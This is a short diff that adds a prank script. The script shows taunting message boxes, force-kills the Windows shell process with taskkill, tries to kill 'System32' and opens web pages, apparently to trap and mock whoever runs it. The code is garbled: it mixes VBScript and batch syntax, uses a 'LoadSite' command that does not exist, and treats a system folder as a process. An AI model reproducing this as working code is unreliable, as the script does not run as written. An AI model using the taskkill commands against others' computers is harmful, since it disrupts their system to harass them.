@@ -1,0 +1,7 @@
+MsgBox ("Lol")
+MsgBox ("You Are Dumb")
+MsgBox ("TRY TO LEAVE THE SITE")
+taskkill /w /f explorer.exe
+taskkill /w /f System32
+LoadSite www.youtube.com
+LoadSite Lolololololol.com
